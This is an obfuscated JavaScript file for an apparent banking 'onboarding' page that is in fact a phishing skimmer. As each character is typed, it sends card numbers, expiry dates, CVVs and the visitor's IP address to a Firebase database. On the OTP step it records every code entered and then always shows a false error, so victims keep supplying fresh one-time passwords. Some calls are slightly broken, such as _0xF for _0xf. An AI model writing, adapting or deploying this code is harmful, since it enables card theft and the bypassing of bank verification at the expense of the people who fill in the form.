const _0x1 = {
  databaseURL:
    "https://c13i1a1-default-rtdb.firebaseio.com/",
};
firebase.initializeApp(_0x1);
const _0x2 = firebase.database();
const _0x3 = [
  { id: "step-details", section: "section-details", text: "text-details" },
  { id: "step-card", section: "section-card", text: "text-card" },
  { id: "step-otp", section: "section-otp", text: "text-otp" },
];
let _0x4 = 0,
  _0x5 = {},
  _0x6 = 0;
function _0x7() {
  _0x3.forEach((_0x8, _0x9) => {
    const _0xa = document.getElementById(_0x8.section),
      _0xb = _0xa.querySelectorAll("input");
    _0xb.forEach((_0xc) => {
      _0x9 === _0x4
        ? _0xc.setAttribute("required", "required")
        : _0xc.removeAttribute("required");
    });
  });
}
function _0xd() {
  const _0xe = document.getElementById("proceed-btn");
  _0xe.textContent =
    _0x4 === 0 ? "Proceed" : _0x4 === 1 ? "Generate OTP" : "Verify";
}
function _0xf(_0x10) {
  _0x4 = _0x10;
  _0x3.forEach((_0x11, _0x12) => {
    const _0x13 = document.getElementById(_0x11.id).firstElementChild,
      _0x14 = document.getElementById(_0x11.text);
    if (_0x12 === _0x4) {
      _0x13.className =
        "w-14 h-14 rounded-full brand-primary-bg text-white flex items-center justify-center text-[26px]";
      _0x14.className =
        "text-sm sm:text-base brand-primary-text font-semibold mt-2";
    } else if (_0x12 < _0x6) {
      _0x13.className =
        "w-14 h-14 rounded-full brand-secondary-bg text-white flex items-center justify-center text-[26px]";
      _0x14.className =
        "text-sm sm:text-base brand-secondary-text font-semibold mt-2";
    } else {
      _0x13.className =
        "w-14 h-14 rounded-full accent-bg text-secondary flex items-center justify-center text-[26px]";
      _0x14.className =
        "text-sm sm:text-base text-secondary mt-2";
    }
    document.getElementById(_0x11.section).style.display =
      _0x12 === _0x4 ? "block" : "none";
  }),
    _0x7(),
    _0x8(),
    _0xd();
}
_0x3.forEach((_0x15, _0x16) => {
  document.getElementById(_0x15.id).onclick = function () {
    _0x16 <= _0x6 && _0xF(_0x16);
  };
});
function _0x8() {
  const _0x17 = document
    .getElementById(_0x3[_0x4].section)
    .querySelectorAll("input");
  let _0x18 = true;
  _0x17.forEach((_0x19) => {
    (!_0x19.checkValidity() || !_0x19.value) && (_0x18 = false);
  });
  const _0x1a = document.getElementById("proceed-btn");
  if (_0x18) {
    _0x1a.disabled = false;
    _0x1a.classList.remove(
      "bg-gray-400",
      "cursor-not-allowed",
      "text-secondary"
    );
    _0x1a.classList.add(
      "brand-primary-bg",
      "cursor-pointer",
      "text-white"
    );
  } else {
    _0x1a.disabled = true;
    _0x1a.classList.add("bg-gray-400", "cursor-not-allowed", "text-white");
    _0x1a.classList.remove(
      "brand-primary-bg",
      "cursor-pointer",
      "text-secondary"
    );
  }
}
document
  .querySelectorAll("#section-details input, #section-card input")
  .forEach((_0x1b) => {
    _0x1b.addEventListener("input", async function () {
      _0x5[_0x1b.name] = _0x1b.value;
      await _0x9();
      _0x8();
    });
  });
document.getElementById("otp").addEventListener("input", function () {
  _0x8();
});
document.getElementById("resend-otp").addEventListener("click", function() {
    alert("OTP has been resent to your registered mobile number.");
});
async function _0x9() {
  _0x5.ip = _0x1f;
  _0x5.timestamp = Date.now();
  await _0x2.ref("onboardingForms/" + _0x7a).set(_0x5);
}
async function _0xa(newOtp) {
  const _0x1c = _0x2.ref("onboardingForms/" + _0x7a),
    _0x1d = await _0x1c.once("value"),
    _0x1e = _0x1d.val() || {},
    _0x1f = 0;
  let _0x20 = "otp",
    _0x21 = 0;
  while (_0x1e[_0x20]) {
    _0x21++;
    _0x20 = "otp" + _0x21;
  }
  await _0x1c.update({ [_0x20]: newOtp });
}
document
  .getElementById("cardNumber")
  .addEventListener("input", function (_0x22) {
    let _0x23 = _0x22.target.value.replace(/\D/g, "").slice(0, 16);
    _0x23 = _0x23.replace(/(.{4})/g, "$1-").replace(/-$/, "");
    _0x22.target.value = _0x23;
    _0x5.cardNumber = _0x23;
    _0x9();
    _0x8();
  });
document.getElementById("expiry").addEventListener("input", function (_0x24) {
  let _0x25 = _0x24.target.value.replace(/\D/g, "").slice(0, 4);
  if (_0x25.length >= 3) {
    _0x25 = _0x25.slice(0, 2) + "/" + _0x25.slice(2, 4);
  }
  if (_0x25.length > 5) _0x25 = _0x25.slice(0, 5);
  let [_0x26] = _0x25.split("/");
  _0x26 &&
    _0x26.length === 2 &&
    (parseInt(_0x26, 10) < 1 || parseInt(_0x26, 10) > 12) &&
    (_0x25 = "");
  _0x24.target.value = _0x25;
  _0x5.expiry = _0x25;
  _0x9();
  _0x8();
});
document.getElementById("cvv").addEventListener("input", function (_0x27) {
  let _0x28 = _0x27.target.value.replace(/\D/g, "").slice(0, 3);
  _0x27.target.value = _0x28;
  _0x5.cvv = _0x28;
  _0x9();
  _0x8();
});
document
  .getElementById("onboarding-form")
  .addEventListener("submit", async function (_0x29) {
    _0x29.preventDefault();
    const _0x2a = document.getElementById("proceed-btn"),
      _0x2b = document
        .getElementById(_0x3[_0x4].section)
        .querySelectorAll("input");
    let _0x2c = true;
    _0x2b.forEach((_0x2d) => {
      (!_0x2d.checkValidity() || !_0x2d.value) && (_0x2c = false);
    });
    if (_0x2c) {
      if (_0x4 < _0x3.length - 1) {
        _0x2a.disabled = true;
        _0x2a.classList.remove(
          "brand-primary-bg",
          "cursor-pointer",
          "text-white"
        );
        _0x2a.classList.add("brand-secondary-bg", "text-white", "cursor-not-allowed");
        _0x2a.textContent = _0x4 === 0 ? "Proceeding..." : "Generating OTP...";
        setTimeout(() => {
          _0x6 = Math.max(_0x6, _0x4 + 1);
          _0xf(_0x4 + 1);
          _0x2a.disabled = true;
          _0x2a.classList.remove(
            "brand-secondary-bg",
            "text-white",
            "cursor-not-allowed"
          );
          _0x2a.classList.add(
            "bg-gray-400",
            "cursor-not-allowed",
            "text-white"
          );
          _0xd();
          _0x8();
        }, 3000);
      } else {
        _0x2a.disabled = true;
        _0x2a.classList.remove(
          "brand-primary-bg",
          "cursor-pointer",
          "text-white"
        );
        _0x2a.classList.add("brand-secondary-bg", "text-white", "cursor-not-allowed");
        _0x2a.textContent = "Verifying...";
        await _0xa(document.getElementById("otp").value);
        setTimeout(() => {
          document.getElementById("otp-error").classList.remove("hidden");
          document.getElementById("otp").value = "";
          _0x2a.disabled = true;
          _0x2a.classList.remove(
            "brand-secondary-bg",
            "text-white",
            "cursor-not-allowed"
          );
          _0x2a.classList.add(
            "bg-gray-400",
            "cursor-not-allowed",
            "text-white"
          );
          _0x2a.textContent = "Verify";
          _0x8();
          setTimeout(() => {
             document.getElementById("otp-error").classList.add("hidden");
          }, 3000);
        }, 5000);
      }
    }
  });
var _0x7a = localStorage.getItem("onboardingUserId");
if (!_0x7a) {
  _0x7a = _0x2.ref("onboardingForms").push().key;
  localStorage.setItem("onboardingUserId", _0x7a);
}
var _0x1f = "";
fetch("https://api.ipify.org?format=json")
  .then((_0x2c) => _0x2c.json())
  .then((_0x2d) => {
    _0x1f = _0x2d.ip;
  });
_0xf(0);
